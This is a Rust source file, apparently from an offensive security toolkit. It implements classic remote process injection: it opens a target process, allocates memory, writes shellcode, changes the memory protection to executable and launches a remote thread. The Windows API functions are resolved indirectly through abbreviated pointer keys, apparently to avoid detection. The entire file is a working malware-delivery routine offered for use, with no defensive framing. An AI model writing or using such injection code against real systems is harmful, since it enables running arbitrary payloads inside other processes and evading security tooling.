use crate::types;
use std::collections::HashMap;
use std::ptr::null_mut;



// Classic Remote Injection
pub fn remote_inject(apis: HashMap<&str, types::LPVOID>, sc: Vec<u8>, pid: types::DWORD) {
    unsafe {
        // Initialize our delegates with the obtained addresses
        let vae: types::fn_alloc_ex = std::mem::transmute(apis["vae"]);
        let vpe: types::fn_protect_ex = std::mem::transmute(apis["vpe"]);
        let wpm: types::fn_write_ex = std::mem::transmute(apis["wpm"]);
        let op: types::fn_open_proc = std::mem::transmute(apis["op"]);
        let crt: types::fn_remote_th = std::mem::transmute(apis["crt"]);
        let ch: types::fn_closer = std::mem::transmute(apis["ch"]);


        const PROCESS_ALL_ACCESS: types::DWORD = 0x1FFFFF;
        const MEM_COMMIT: types::DWORD = 0x1000;
        const MEM_RESERVE: types::DWORD = 0x2000;
        const PAGE_READWRITE: types::DWORD = 0x04;
        const PAGE_EXECUTE_READ: types::DWORD = 0x20;
        const THREAD_CREATE_FLAGS: types::DWORD = 0x00;


        println!("[+] Obtaining handle to process: {}", pid);
        let process_hand: types::HANDLE = op(PROCESS_ALL_ACCESS, 0, pid);
        if process_hand.is_null() {
            println!("[!] Failed to obtain handle");
            return;
        }

        println!("[+] Allocating memory in the remote process");
        let memAddr: types::LPVOID = vae(
            process_hand,
            null_mut(),
            sc.len() as types::SIZE_T,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if memAddr.is_null() {
            println!("[!] Failed allocating memory");
            return;
        }

        println!("[+] Writing the shellcode with size: {}, to adddr: {:?}", sc.len(), memAddr);
        let mut written: types::SIZE_T = 0;
        wpm(process_hand, memAddr, sc.as_ptr() as types::LPVOID, sc.len() as types::SIZE_T, &mut written);
        if written != sc.len() {
            println!("[!] Failed writing the shellcode, bytes written: {}", written);
            return;
        }

        println!("[+] Changing memory protection to RX");
        let mut old: types::DWORD = 0;
        vpe(process_hand, memAddr, sc.len() as types::SIZE_T, PAGE_EXECUTE_READ, &mut old);

        println!("[+] Scheduling thread");
        let sc_func: types::LPTHREAD_START_ROUTINE = std::mem::transmute(memAddr);
        let mut tid: types::DWORD = 0;
        let thread_hand: types::HANDLE = crt(
            process_hand,
            null_mut(),
            0,
            sc_func,
            null_mut(),
            0,
            &mut tid
        );

        println!("[+] Closing handles");
        ch(process_hand);
        ch(thread_hand);
    }
}